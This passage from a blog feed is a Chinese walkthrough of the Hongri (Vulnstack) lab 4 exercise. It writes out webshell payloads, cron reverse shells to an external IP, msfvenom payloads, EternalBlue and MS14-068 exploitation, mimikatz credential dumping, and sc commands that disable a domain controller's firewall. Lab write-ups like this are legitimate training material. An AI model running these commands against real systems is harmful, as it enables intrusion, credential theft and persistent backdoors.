定期查看系统安全日志，并且使用杀毒软件定期对系统进行体检。</p>\n<p>7、 下载补丁地址 <a href=\"http://www.catalog.update.microsoft.com/search.aspx?q=%E8%A1%A5%E4%B8%81%E7%BC%96%E5%8F%B7\">http://www.catalog.update.microsoft.com/search.aspx?q = 补丁编号</a> （根据自己的系统版本在下图中查找补丁编号）</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041621577.png\" alt=\"image-20211116172902197\" class=\"lazyload\"></p>\n<h2 id=\"reference\"><a class=\"markdownIt-Anchor\" href=\"#reference\">#</a> Reference</h2>\n<p><a href=\"https://xz.aliyun.com/t/8095#toc-4\">https://xz.aliyun.com/t/8095#toc-4</a></p>\n",
            "tags": []
        },
        {
            "id": "http://blog.m1n.me/2021/11/16/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(%E5%9B%9B)%E7%AC%94%E8%AE%B0/",
            "url": "http://blog.m1n.me/2021/11/16/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(%E5%9B%9B)%E7%AC%94%E8%AE%B0/",
            "title": "红日靶场(四)笔记",
            "date_published": "2021-11-16T14:22:21.000Z",
            "content_html": "<p>红日靶场四学习记录</p>\n<span id=\"more\"></span>\n<h2 id=\"前言\"><a class=\"markdownIt-Anchor\" href=\"#前言\">#</a> 前言</h2>\n<p>因为做的过程中，时间跨度比较大，前半段是打的公司的靶场，后半段自己搭建靶场，故 IP 有所变动。拓扑如下：<br>\n<a href=\"http://vulnstack.qiyuanxuetang.net/vuln/detail/6/\">http://vulnstack.qiyuanxuetang.net/vuln/detail/6/</a></p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041547309.png\" alt=\"13\" class=\"lazyload\"></p>\n<p>Ubuntu 用 Docker 跑了三个 Web 服务，一台 Win7 域成员机，一台 Winserver2008 域控</p>\n<h2 id=\"外网打点\"><a class=\"markdownIt-Anchor\" href=\"#外网打点\">#</a> 外网打点</h2>\n<h3 id=\"2001端口struct2\"><a class=\"markdownIt-Anchor\" href=\"#2001端口struct2\">#</a> 2001 端口 Struct2</h3>\n<p>Burp 抓包看到 Struct2 字样，直接工具测试一把梭</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815170347.png\" alt=\"\" class=\"lazyload\"></p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815170720.png\" alt=\"\" class=\"lazyload\"></p>\n<h3 id=\"2002端口tomcat\"><a class=\"markdownIt-Anchor\" href=\"#2002端口tomcat\">#</a> 2002 端口 Tomcat</h3>\n<p>可以参考 https://www.freebuf.com/articles/web/271892.html</p>\n<p>使用 PUT 上传冰蝎马，注意直接上传 <code>/shell.jsp</code>  不行哦</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815180101.png\" alt=\"\" class=\"lazyload\"></p>\n<h3 id=\"2003端口phpmyadmin-481\"><a class=\"markdownIt-Anchor\" href=\"#2003端口phpmyadmin-481\">#</a> 2003 端口 phpMyAdmin 4.8.1</h3>\n<p>可以参考 https://www.dazhuanlan.com/oliiiflorrr/topics/1144804</p>\n<ol>\n<li>\n<p>验证漏洞是否存在</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815181519.png\" alt=\"\" class=\"lazyload\"></p>\n</li>\n<li>\n<p>使用 SELECT 语句后包含 session 文件来 get shell，写 shell <code>SELECT &quot;&lt;?php phpinfo();file_put_contents('m1n.php', '&lt;?=@eval($_POST[1]);');?&gt;&quot;  </code> ，访问发现 <code>http://10.0.5.100:2003/index.php?target=db_sql.php?/../../../../../../../../../tmp/sess_a851fdf11a88214580de888e61ed1867</code>  出现 phpinfo，用蚁剑连接 m1n.php 即可。</p>\n</li>\n</ol>\n<h2 id=\"docker逃逸2002端口的tomcat\"><a class=\"markdownIt-Anchor\" href=\"#docker逃逸2002端口的tomcat\">#</a> Docker 逃逸（2002 端口的 Tomcat）</h2>\n<h3 id=\"如何判断是否在docker里\"><a class=\"markdownIt-Anchor\" href=\"#如何判断是否在docker里\">#</a> 如何判断是否在 Docker 里</h3>\n<ul>\n<li>检查  <code>/.dockerenv</code>  文件是否存在</li>\n<li>检查  <code>/proc/1/cgroup</code>  内是否包含 Docker 等字符串</li>\n</ul>\n<h3 id=\"尝试dirtycow漏洞逃逸\"><a class=\"markdownIt-Anchor\" href=\"#尝试dirtycow漏洞逃逸\">#</a> 尝试 DirtyCow 漏洞逃逸</h3>\n<ol>\n<li>\n<p>下载 POC：<a href=\"https://github.com/scumjr/dirtycow-vdso\">https://github.com/scumjr/dirtycow-vdso</a></p>\n</li>\n<li>\n<p>编译，上传，监听，运行，没反应，下一个。</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\">git clone https:<span class=\"hljs-regexp\">//gi</span>thub.com<span class=\"hljs-regexp\">/scumjr/</span>dirtycow-vdso.git<br>cd dirtycow-vdso<br>make<br>./<span class=\"hljs-number\">0</span>xdeadbeef ip:port<br></code></pre></td></tr></table></figure>\n</li>\n</ol>\n<h3 id=\"尝试runc容器逃逸漏洞cve-2019-5736\"><a class=\"markdownIt-Anchor\" href=\"#尝试runc容器逃逸漏洞cve-2019-5736\">#</a> 尝试 runC 容器逃逸漏洞（CVE-2019-5736）</h3>\n<ol>\n<li>下载 POC：<a href=\"https://github.com/Frichetten/CVE-2019-5736-PoC\">https://github.com/Frichetten/CVE-2019-5736-PoC</a></li>\n<li>改 POC，把 payload 那行改成自己 VPS 的 IP</li>\n<li>编译（建议 Linux 环境下） <code>CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go</code></li>\n<li>上传文件，监听端口，执行，没反应，下一个。</li>\n</ol>\n<h3 id=\"尝试特权模式逃逸\"><a class=\"markdownIt-Anchor\" href=\"#尝试特权模式逃逸\">#</a> 尝试特权模式逃逸</h3>\n<ol>\n<li>\n<p><code>fdisk -l</code>  查看磁盘</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210816152320.png\" alt=\"\" class=\"lazyload\"></p>\n</li>\n<li>\n<p>在根目录下创建文件夹，把 /dev/sda1 挂在到该文件夹</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">mkdir</span> /m<span class=\"hljs-number\">1</span>n<br><span class=\"hljs-attribute\">mount</span> /dev/sda<span class=\"hljs-number\">1</span> /m<span class=\"hljs-number\">1</span>n<br></code></pre></td></tr></table></figure>\n</li>\n<li>\n<p>可以看到宿主机的文件都到了 /m1n 目录下</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041548215.png\" alt=\"image-20210816152534150\" class=\"lazyload\"></p>\n</li>\n</ol>\n<h4 id=\"尝试写定时任务来反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#尝试写定时任务来反弹shell\">#</a> 尝试写定时任务来反弹 shell</h4>\n<p>参考：<a href=\"https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/\">https://m3lon.github.io/2019/03/18 / 解决 ubuntu-crontab 反弹 shell 失败的问题 /</a></p>\n<ol>\n<li>写文件到 <code>/var/spool/cron/crontabs/root</code> ，注意写到 <code>/var/spool/cron/root</code>  不行嗷</li>\n<li>同时注意 root 文件的权限必须为 600</li>\n<li>注意定时任务文件内容中，路径要用绝对路径，建议把命令写成 <code>.sh</code>  文件，然后 <code>chmod +x</code> ，然后调用，不容易出错</li>\n<li>也可以 <code>*/1 * * * *  bash -c &quot;bash -i  &gt;&amp;/dev/tcp/123.207.x.x/1234 0&gt;&amp;1&quot;</code></li>\n<li>在本地的 Ubuntu20 虚拟机中成功反弹 shell，但是靶场环境下没法成功，写入了定时任务必须 restart 才可以执行，否则不执行，无奈。</li>\n</ol>\n<p><strong>定时任务相关笔记：</strong></p>\n<ol>\n<li>\n<p>定时任务有时无法看到报错信息，可以这样获取报错信息</p>\n<p><code>\\* * * * * '/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.106/7777 0&gt;&amp;1'&gt;/tmp/error.txt 2&gt;&amp;1</code></p>\n</li>\n<li>\n<p>定时任务查看日志：<a href=\"https://www.cnblogs.com/zhangshengxiang/p/11842326.html\">https://www.cnblogs.com/zhangshengxiang/p/11842326.html</a></p>\n<p>（1）查看系统日志直接： <code>tail -f /var/log/syslog</code></p>\n<p>（2）查看 crontab 日志：</p>\n<p>​\t方法 1</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\"><span class=\"hljs-number\">1</span>. 修改rsyslog文件，将<span class=\"hljs-regexp\">/etc/</span>rsyslog.d/<span class=\"hljs-number\">50</span>-default.conf 文件中的<span class=\"hljs-comment\">#cron.*前的#删掉；</span><br><span class=\"hljs-number\">2</span>. 重启rsyslog服务service rsyslog restart<br><span class=\"hljs-number\">3</span>. 重启cron服务service cron restart<br></code></pre></td></tr></table></figure>\n<p>​\t方法 2</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\"><span class=\"hljs-number\">1</span>. 编辑 <span class=\"hljs-regexp\">/etc/</span>syslog.conf，并且打开以cron.*开始的那行注释。<br><span class=\"hljs-number\">2</span>. 运行 <span class=\"hljs-regexp\">/etc/i</span>nit.d/sysklogd restart<br><span class=\"hljs-number\">3</span>. 运行 <span class=\"hljs-regexp\">/etc/i</span>nit.d/cron restart<br></code></pre></td></tr></table></figure>\n<p>​\t查看 cron 日志</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\"><span class=\"hljs-number\">1</span>. linux<br>看 <span class=\"hljs-regexp\">/var/</span>log<span class=\"hljs-regexp\">/cron这个文件就可以，可以用tail -f /</span>var<span class=\"hljs-regexp\">/log/</span>cron观察（或者<span class=\"hljs-regexp\">/var/</span>log/cron.log）<br><br><span class=\"hljs-number\">2</span>. unix<br>在 <span class=\"hljs-regexp\">/var/</span>spool<span class=\"hljs-regexp\">/cron/</span>tmp文件中，有croutXXX001864的tmp文件，tail 这些文件就可以看到正在执行的任务了。<br><br><span class=\"hljs-number\">3</span>. mail任务<br>在 <span class=\"hljs-regexp\">/var/</span>spool<span class=\"hljs-regexp\">/mail/</span>root 文件中，有crontab执行日志的记录，用tail -f <span class=\"hljs-regexp\">/var/</span>spool<span class=\"hljs-regexp\">/mail/</span>root 即可查看最近的crontab执行情况<br></code></pre></td></tr></table></figure>\n</li>\n</ol>\n<h4 id=\"尝试写ssh公钥来连接\"><a class=\"markdownIt-Anchor\" href=\"#尝试写ssh公钥来连接\">#</a> 尝试写.ssh 公钥来连接</h4>\n<ol>\n<li>\n<p>本地生成公私钥</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">ssh</span>-keygen -f m<span class=\"hljs-number\">1</span>n<br><span class=\"hljs-attribute\">chmod</span> <span class=\"hljs-number\">600</span> m<span class=\"hljs-number\">1</span>n<br></code></pre></td></tr></table></figure>\n</li>\n<li>\n<p>把 m1n.pub 文件上传到服务器的 <code>/root/.ssh/</code>  目录下（注意，是 /m1n 下的 /root/.ssh），没有这个目录就创建这个目录</p>\n</li>\n<li>\n<p>把 m1n.pub 的文件内容写到 authorized_keys 文件中 <code>cat m1n.pub &gt; authorized_keys</code></p>\n</li>\n<li>\n<p>然后 <code>ssh -i m1n root@ip</code>  连接，即可</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210816161055.png\" alt=\"\" class=\"lazyload\"></p>\n</li>\n<li>\n<p>踩坑笔记：不要写公钥到 <code>/home/ubuntu/.ssh/</code>  目录下，连不上。</p>\n</li>\n</ol>\n<h2 id=\"内网渗透\"><a class=\"markdownIt-Anchor\" href=\"#内网渗透\">#</a> 内网渗透</h2>\n<h3 id=\"传\"><a class=\"markdownIt-Anchor\" href=\"#传\">#</a> 传🐎</h3>\n<h4 id=\"msf\"><a class=\"markdownIt-Anchor\" href=\"#msf\">#</a> MSF🐎</h4>\n<ol>\n<li>\n<p>生成 msf🐎</p>\n<p><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.192.168.145 LPORT=4444 -f elf &gt; mshell.elf</code></p>\n</li>\n<li>\n<p>把🐎儿传到目标机子上面</p>\n</li>\n<li>\n<p>攻击机执行以下</p>\n<figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs routeros\">use exploit/multi/handler<br><span class=\"hljs-builtin-name\">set</span> payload linux/x64/meterpreter/reverse_tcp<br><span class=\"hljs-builtin-name\">set</span> lhost 10.192.168.145<br><span class=\"hljs-builtin-name\">set</span> lport 4444<br>run<br></code></pre></td></tr></table></figure>\n</li>\n<li>\n<p>目标机器添加权限后执行 mshell.elf</p>\n</li>\n<li>\n<p>kali 接收到 shell</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108261512059.png\" alt=\"\" class=\"lazyload\"></p>\n</li>\n<li>\n<p>msf 拿到 shell 后，需要导入路由，使用 msf6 的自动路由导入</p>\n<figure class=\"highlight stata\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs stata\">background<br><br><span class=\"hljs-keyword\">use</span> <span class=\"hljs-keyword\">post</span>/multi/manage/autoroute<br><br><span class=\"hljs-keyword\">set</span> session x<br><br><span class=\"hljs-keyword\">run</span><br></code></pre></td></tr></table></figure>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271034464.png\" alt=\"\" class=\"lazyload\"></p>\n</li>\n</ol>\n<h3 id=\"代理转发\"><a class=\"markdownIt-Anchor\" href=\"#代理转发\">#</a> 代理转发</h3>\n<h4 id=\"使用ew代理转发\"><a class=\"markdownIt-Anchor\" href=\"#使用ew代理转发\">#</a> 使用 ew 代理转发</h4>\n<ol>\n<li>上传 ew_for_linux64</li>\n<li>执行 <code>./ew -s ssocksd -l 8888</code></li>\n<li>更改 kali 的 /etc/proxychains4.conf 文件，添加 socks5 ip prot</li>\n<li>在需要代理时，执行命令如 <code>proxychains4 curl http://127.0.0.1:2003/</code>  即可</li>\n</ol>\n<h3 id=\"ubuntu信息收集\"><a class=\"markdownIt-Anchor\" href=\"#ubuntu信息收集\">#</a> Ubuntu 信息收集</h3>\n<ol>\n<li>\n<p>从路由表可以看到有几个网段，有个 183 网段应该就是内网网段了</p>\n</li>\n<li>\n<p>msf 进行一波存活扫描</p>\n<figure class=\"highlight gams\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs gams\">use auxiliary/scanner/discovery/udp_probe<br><span class=\"hljs-keyword\">set</span> rhosts <span class=\"hljs-comment\">192.168.183.0-255</span><br><span class=\"hljs-keyword\">set</span> <span class=\"hljs-comment\">threads 5</span><br>run<br></code></pre></td></tr></table></figure>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271043598.png\" alt=\"\" class=\"lazyload\"></p>\n<p>可以看到有 128、130 两台机子。</p>\n</li>\n<li>\n<p>扫一下 ms17-010</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">use</span> auxiliary/scanner/smb/smb_ms<span class=\"hljs-number\">17</span>_<span class=\"hljs-number\">010</span><br><span class=\"hljs-attribute\">set</span> rhosts <span class=\"hljs-number\">192.168.183.128</span>-<span class=\"hljs-number\">130</span><br><span class=\"hljs-attribute\">run</span><br></code></pre></td></tr></table></figure>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271046846.png\" alt=\"\" class=\"lazyload\"></p>\n<p>可以看到 128 的 win7 和 130 的 winserver2008 都可能存在永恒之蓝。</p>\n</li>\n<li>\n<p>尝试打永恒之蓝，测试发现 128 的 win7 能打通，130 的 winserver2008 打不通。</p>\n<figure class=\"highlight gams\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs gams\">setg Proxies socks5:<span class=\"hljs-number\">10.0</span><span class=\"hljs-number\">.5</span><span class=\"hljs-number\">.100</span>:<span class=\"hljs-number\">8888</span>\t\t\t\t\t<span class=\"hljs-comment\">//MSF走ew的代理</span><br><span class=\"hljs-keyword\">set</span> ReverseAllowProxy <span class=\"hljs-comment\">true</span>\t\t\t\t\t\t\t//开启反向代理<br>use <span class=\"hljs-comment\">exploit</span>/windows/<span class=\"hljs-comment\">smb</span>/ms17_010_eternalblue<br>set payload windows/<span class=\"hljs-comment\">x64</span>/meterpreter/<span class=\"hljs-comment\">bind_tcp</span><br><span class=\"hljs-keyword\">set</span> <span class=\"hljs-comment\">rhost 192.168.183.128</span><br><span class=\"hljs-keyword\">set</span> <span class=\"hljs-comment\">lport 4444</span><br><span class=\"hljs-keyword\">set</span> <span class=\"hljs-comment\">AutoRunScript post</span>/windows/<span class=\"hljs-comment\">manage</span>/migrate       <span class=\"hljs-comment\">//自动迁移进程</span><br>run<br></code></pre></td></tr></table></figure>\n<p>成功拿下 shell</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271535393.png\" alt=\"\" class=\"lazyload\"></p>\n</li>\n</ol>\n<h3 id=\"win7权限维持\"><a class=\"markdownIt-Anchor\" href=\"#win7权限维持\">#</a> Win7 权限维持</h3>\n<ol>\n<li>\n<p>虽然拿到了 shell，但是在使用过程中发现这个 shell 经常掉线，只能想办法弄个稳定点的 shell</p>\n</li>\n<li>\n<p>拿 ubuntu 当作跳板机，把 frps 传到 ubuntu 上，不修改配置，直接执行 <code>./frps -c ./frps.ini</code></p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041549039.png\" alt=\"image-20211112170138230\" class=\"lazyload\"></p>\n</li>\n<li>\n<p>把 frpc 上传到自己的 CS 服务器，修改 frpc.ini 后启动 frpc： <code>./frpc -c ./frpc.ini</code></p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041549704.png\" alt=\"image-20211112170249583\" class=\"lazyload\"></p>\n</li>\n<li>\n<p>CS 创建一个 ip 为 ubuntu 的监听器</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041549079.png\" alt=\"image-20211112170412976\" class=\"lazyload\"></p>\n</li>\n<li>\n<p>生成马传到 win7 上执行即可上线</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041549213.png\" alt=\"image-20211112170455408\" class=\"lazyload\"></p>\n<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.157.128 LPORT=4455 -f exe -o mshell.exe</code></p>\n<p>use exploit/multi/handler</p>\n<p>set payload windows/meterpreter/reverse_tcp</p>\n</li>\n</ol>\n<h3 id=\"win7信息收集\"><a class=\"markdownIt-Anchor\" href=\"#win7信息收集\">#</a> Win7 信息收集</h3>\n<ol>\n<li>\n<p><code>route print</code></p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041549823.png\" alt=\"image-20211112171015589\" class=\"lazyload\"></p>\n</li>\n<li>\n<p><code>net user /domain</code></p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071737928.png\" alt=\"\" class=\"lazyload\"></p>\n</li>\n<li>\n<p><code>net user</code></p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071745632.png\" alt=\"\" class=\"lazyload\"></p>\n</li>\n<li>\n<p><code>net view</code></p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071742103.png\" alt=\"\" class=\"lazyload\"></p>\n</li>\n<li>\n<p><code>nslookup WIN-ENS2VR5TR3N</code></p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550718.png\" alt=\"image-20211112171507481\" class=\"lazyload\"></p>\n</li>\n</ol>\n<h3 id=\"win7提权\"><a class=\"markdownIt-Anchor\" href=\"#win7提权\">#</a> Win7 提权</h3>\n<p>先 systeminfo 拿到补丁列表，使用 http://bugs.hacking8.com/tiquan/ 直接查询可用 exp，发现 MS16-135 可用，直接梼杌 MS16-135 提权一把梭</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550478.png\" alt=\"image-20211114004439133\" class=\"lazyload\"></p>\n<p>拿到新 shell，尝试用猕猴桃拿密码</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550982.png\" alt=\"image-20211114004938173\" class=\"lazyload\"></p>\n<p><code>mimikatz sekurlsa::logonpasswords</code>  拿到明文密码</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550669.png\" alt=\"image-20211114005145157\" class=\"lazyload\"></p>\n<h3 id=\"win7打域控\"><a class=\"markdownIt-Anchor\" href=\"#win7打域控\">#</a> Win7 打域控</h3>\n<p>同样的，使用 http://bugs.hacking8.com/tiquan/ 发现可以用 MS14-068，工具：<a href=\"https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068\">https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068</a></p>\n<p>用收集到的 sid、成员名、密码伪造票据</p>\n<figure class=\"highlight subunit\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs subunit\">//ms14<span class=\"hljs-string\">-068</span>.exe -u 域成员名@域名.com -s 域成员sid -d 域控制器ip地址 -p 域成员密码<br><br>ms14<span class=\"hljs-string\">-068</span>.exe -u douser@DEMO.com -s S<span class=\"hljs-string\">-1</span><span class=\"hljs-string\">-5</span><span class=\"hljs-string\">-21</span><span class=\"hljs-string\">-979886063</span><span class=\"hljs-string\">-1111900045</span><span class=\"hljs-string\">-1414766810</span><span class=\"hljs-string\">-1107</span> -d 192.168.183.130 -p Dotest123<br></code></pre></td></tr></table></figure>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550909.png\" alt=\"image-20211114010319666\" class=\"lazyload\"></p>\n<p>用猕猴桃注入票据</p>\n<figure class=\"highlight dts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs dts\">mimikatz kerberos::purge         <span class=\"hljs-comment\">//清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造</span><br>mimikatz kerberos::list          <span class=\"hljs-comment\">//查看当前机器凭证</span><br>mimikatz kerberos::ptc <span class=\"hljs-params\">&lt;生成的票据文件&gt;</span>   <span class=\"hljs-comment\">//将票据注入到内存中</span><br></code></pre></td></tr></table></figure>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550025.png\" alt=\"image-20211114010623765\" class=\"lazyload\"></p>\n<p>尝试查看域控的 C 盘</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">net</span> use \\\\WIN-ENS<span class=\"hljs-number\">2</span>VR<span class=\"hljs-number\">5</span>TR<span class=\"hljs-number\">3</span>N<br><span class=\"hljs-attribute\">dir</span> \\\\WIN-ENS<span class=\"hljs-number\">2</span>VR<span class=\"hljs-number\">5</span>TR<span class=\"hljs-number\">3</span>N\\c$<br></code></pre></td></tr></table></figure>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550134.png\" alt=\"image-20211114010832260\" class=\"lazyload\"></p>\n<h3 id=\"域控维权\"><a class=\"markdownIt-Anchor\" href=\"#域控维权\">#</a> 域控维权</h3>\n<p>再生成一个 CS 马，通过 win7 传到 DC 上</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550189.png\" alt=\"image-20211114011638641\" class=\"lazyload\"></p>\n<p>关掉 DC 的防火墙</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">sc</span> \\\\WIN-ENS<span class=\"hljs-number\">2</span>VR<span class=\"hljs-number\">5</span>TR<span class=\"hljs-number\">3</span>N create unablefirewall binpath= <span class=\"hljs-string\">&quot;netsh advfirewall set allprofiles state off&quot;</span><br><br><span class=\"hljs-attribute\">sc</span> \\\\WIN-ENS<span class=\"hljs-number\">2</span>VR<span class=\"hljs-number\">5</span>TR<span class=\"hljs-number\">3</span>N start unablefirewall<br></code></pre></td></tr></table></figure>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550638.png\" alt=\"image-20211114011840038\" class=\"lazyload\"></p>\n<p>执行 shell</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">sc</span> \\\\WIN-ENS<span class=\"hljs-number\">2</span>VR<span class=\"hljs-number\">5</span>TR<span class=\"hljs-number\">3</span>N create bindshell binpath= <span class=\"hljs-string\">&quot;c:\\cshell2.exe&quot;</span><br><span 